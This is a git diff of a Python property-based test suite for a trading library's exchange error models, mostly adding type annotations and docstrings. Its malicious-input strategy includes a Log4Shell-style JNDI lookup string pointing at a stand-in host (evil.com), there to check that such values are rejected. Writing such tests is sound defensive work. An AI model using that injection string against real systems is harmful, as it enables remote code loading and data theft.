@@ -1,7 +1,7 @@
 """Property-based tests for Backpack raw error models.
 
 These tests validate critical security boundary models that process external error response data.
-The models tested here are essential for error handling, API failure processing, and system reliability.
+The models tested here are essential for error handling, API failure processing, and reliability.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious error response data that could manipulate error handling
@@ -14,10 +14,10 @@ Property testing ensures comprehensive coverage of error edge cases and adversar
 """
 
 import json
-from typing import Any
+from typing import Any, Literal, cast
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
@@ -26,13 +26,20 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for security testing malicious values
+MaliciousValue = float | bool | str | list[str] | dict[str, str] | bytes | None
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR ERROR MODEL TESTING
 # =============================================================================
 
 
 def error_code_strategy() -> SearchStrategy[str]:
-    """Generate valid Backpack error code strings."""
+    """Generate valid Backpack error code strings.
+
+    Returns:
+        A Hypothesis strategy for error code strings.
+    """
     return st.sampled_from([
         # Authentication errors
         "INVALID_SIGNATURE",
@@ -64,7 +71,11 @@ def error_code_strategy() -> SearchStrategy[str]:
 
 
 def error_message_strategy() -> SearchStrategy[str]:
-    """Generate valid error message strings."""
+    """Generate valid error message strings.
+
+    Returns:
+        A Hypothesis strategy for error message strings.
+    """
     return st.one_of([
         # Common error messages
         st.just("Signature is invalid or expired."),
@@ -89,25 +100,35 @@ def error_message_strategy() -> SearchStrategy[str]:
         st.just("Order #12345 was not found in the system."),
         # Longer messages
         st.just(
-            "The requested operation could not be completed due to insufficient funds in your account. Please deposit more funds and try again."
+            "The requested operation could not be completed due to insufficient funds. "
+            "Please deposit more funds and try again."
         ),
         st.just(
-            "Your API key does not have sufficient permissions to perform this action. Please contact support or use an API key with appropriate permissions."
+            "Your API key does not have sufficient permissions to perform this action. "
+            "Please contact support or use an API key with appropriate permissions."
         ),
     ])
 
 
 @st.composite
-def valid_api_error_data(draw) -> dict[str, Any]:
-    """Generate valid API error data."""
+def valid_api_error_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid API error data.
+
+    Returns:
+        A dictionary with valid API error data.
+    """
     return {
         "code": draw(error_code_strategy()),
         "message": draw(error_message_strategy()),
     }
 
 
-def malicious_error_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for error security testing."""
+def malicious_error_strategy() -> SearchStrategy[MaliciousValue]:
+    """Generate malicious values for error security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious error values.
+    """
     return st.one_of([
         # Error manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-errors}"),
@@ -182,14 +203,15 @@ class TestBackpackRawApiErrorProperties:
         field_name=st.sampled_from(["code", "message"]), malicious_value=malicious_error_strategy()
     )
     def test_api_error_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousValue
     ) -> None:
         """Property: API error model should reject malicious inputs safely."""
         base_data = {
             "code": "INVALID_SIGNATURE",
             "message": "Signature is invalid or expired.",
         }
-        base_data[field_name] = malicious_value
+        # Type annotation allows malicious testing - runtime will validate
+        base_data[field_name] = cast(str, malicious_value)
 
         # Property: Malicious input should be rejected
         with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
@@ -230,13 +252,16 @@ class TestBackpackRawApiErrorProperties:
             st.dictionaries(st.text(), st.text()),
         ]),
     )
-    def test_api_error_type_validation_properties(self, field_name: str, null_value: Any) -> None:
+    def test_api_error_type_validation_properties(
+        self, field_name: str, null_value: MaliciousValue
+    ) -> None:
         """Property: API error fields should reject non-string types."""
         error_data = {
             "code": "INVALID_SIGNATURE",
             "message": "Signature is invalid or expired.",
         }
-        error_data[field_name] = null_value
+        # Type annotation allows malicious testing - runtime will validate
+        error_data[field_name] = cast(str, null_value)
 
         # Property: Non-string types should be rejected
         with pytest.raises(TypeError):
@@ -327,7 +352,10 @@ class TestBackpackRawApiErrorProperties:
     ) -> None:
         """Property: API error should handle control characters appropriately."""
         # Generate control character
-        control_char = st.characters(whitelist_categories=[unicode_category]).example()
+        # Generate control character - cast needed due to hypothesis type limitation
+
+        unicode_cat = cast(Literal["Cc", "Cf", "Co", "Cs"], unicode_category)
+        control_char = st.characters(whitelist_categories=[unicode_cat]).example()
         message_with_control = f"Error: {base_message}{control_char} occurred"
 
         error_data = {
@@ -386,7 +414,7 @@ class TestBackpackRawApiErrorIntegrationProperties:
                 assume(len(error_data[field].encode("utf-8")) <= 1024)
 
         # Property: All errors should validate successfully
-        error_objects = []
+        error_objects: list[BackpackRawApiError] = []
         for error_data in errors_data:
             obj = BackpackRawApiError.model_validate(error_data)
             error_objects.append(obj)
@@ -396,12 +424,14 @@ class TestBackpackRawApiErrorIntegrationProperties:
             assert isinstance(obj, BackpackRawApiError)
 
         # Property: Each object should preserve its data
-        for obj, original_data in zip(error_objects, errors_data):
+        for obj, original_data in zip(error_objects, errors_data, strict=False):
             assert obj.code == original_data["code"]
             assert obj.message == original_data["message"]
 
     @given(code=error_code_strategy(), malicious_message=malicious_error_strategy())
-    def test_mixed_valid_invalid_properties(self, code: str, malicious_message: Any) -> None:
+    def test_mixed_valid_invalid_properties(
+        self, code: str, malicious_message: MaliciousValue
+    ) -> None:
         """Property: Valid code with malicious message should be rejected."""
         error_data = {
             "code": code,
@@ -414,11 +444,11 @@ class TestBackpackRawApiErrorIntegrationProperties:
 
     @given(malicious_code=malicious_error_strategy(), message=error_message_strategy())
     def test_malicious_code_valid_message_properties(
-        self, malicious_code: Any, message: str
+        self, malicious_code: MaliciousValue, message: str
     ) -> None:
         """Property: Malicious code with valid message should be rejected."""
         # Skip invalid message data
-        assume(isinstance(message, str) and message.strip())
+        assume(message.strip())
         assume(len(message.encode("utf-8")) <= 1024)
 
         error_data = {
